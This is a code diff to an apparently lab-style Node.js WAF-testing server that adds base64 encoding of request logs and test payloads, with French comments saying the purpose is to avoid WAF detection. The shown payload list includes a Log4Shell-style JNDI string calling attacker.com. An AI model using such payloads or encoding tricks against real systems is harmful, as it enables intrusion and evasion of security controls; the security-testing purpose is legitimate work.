@@ -86,8 +86,25 @@ wss.on('connection', (ws) => {
   ws.on('close', () => clients.delete(ws));
 });
 
+// Fonction pour encoder les champs sensibles d'un log (évite détection WAF)
+function encodeLogForWaf(log) {
+  const encoded = { ...log };
+  if (encoded.url) encoded.url = Buffer.from(encoded.url).toString('base64');
+  if (encoded.payload) encoded.payload = Buffer.from(encoded.payload).toString('base64');
+  if (encoded.rawBody) encoded.rawBody = Buffer.from(encoded.rawBody).toString('base64');
+  if (encoded.query) encoded.query = Buffer.from(JSON.stringify(encoded.query)).toString('base64');
+  if (encoded.body && typeof encoded.body === 'object') {
+    encoded.body = Buffer.from(JSON.stringify(encoded.body)).toString('base64');
+  } else if (encoded.body) {
+    encoded.body = Buffer.from(String(encoded.body)).toString('base64');
+  }
+  encoded._encoded = true;
+  return encoded;
+}
+
 function broadcastLog(logEntry) {
-  const message = JSON.stringify(logEntry);
+  const encodedLog = encodeLogForWaf(logEntry);
+  const message = JSON.stringify(encodedLog);
   clients.forEach(client => {
     if (client.readyState === WebSocket.OPEN) {
       client.send(message);
@@ -287,9 +304,10 @@ app.get('/tests', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'tests.html'));
 });
 
-// API pour récupérer les logs
+// API pour récupérer les logs (encodés pour éviter détection WAF)
 app.get('/api/logs', (req, res) => {
-  res.json(requestLogs);
+  const encodedLogs = requestLogs.map(encodeLogForWaf);
+  res.json(encodedLogs);
 });
 
 // API pour les statistiques
@@ -348,7 +366,7 @@ app.post('/api/log-test', (req, res) => {
   res.json({ success: true });
 });
 
-// API pour les payloads de test WAF
+// API pour les payloads de test WAF (encodés en base64 pour éviter la détection WAF)
 app.get('/api/payloads', (req, res) => {
   const payloads = {
     'SQLi': [
@@ -412,7 +430,14 @@ app.get('/api/payloads', (req, res) => {
       "${${lower:j}ndi:ldap://attacker.com/a}"
     ]
   };
-  res.json(payloads);
+  
+  // Encoder tous les payloads en base64 pour éviter la détection WAF
+  const encodedPayloads = {};
+  for (const [category, items] of Object.entries(payloads)) {
+    encodedPayloads[category] = items.map(p => Buffer.from(p).toString('base64'));
+  }
+  
+  res.json({ encoded: true, data: encodedPayloads });
 });
 
 // ========== ENDPOINTS VULNÉRABLES ==========
